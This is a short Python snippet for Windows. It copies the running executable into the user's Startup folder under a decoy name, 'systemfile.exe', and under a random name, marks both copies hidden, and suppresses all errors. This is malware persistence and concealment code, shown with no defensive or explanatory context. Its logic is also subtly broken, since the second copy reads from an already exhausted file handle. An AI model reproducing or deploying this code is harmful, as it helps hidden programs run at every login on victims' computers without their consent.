import os,sys,random,win32file
def add_to_startup():
 try:
  startup=os.path.join(os.getenv("APPDATA"),"Microsoft","Windows","Start Menu","Programs","Startup")
  systemfile=os.path.join(startup,"systemfile.exe")
  randomfile=os.path.join(startup,''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',k=6))+".exe")
  with open(sys.executable,'rb')as src:
   for dst in [systemfile,randomfile]:
    try:
     with open(dst,'wb')as f:f.write(src.read())
     win32file.SetFileAttributes(dst,win32file.FILE_ATTRIBUTE_HIDDEN)
     os.chmod(dst,0o777)
    except:pass
 except:pass
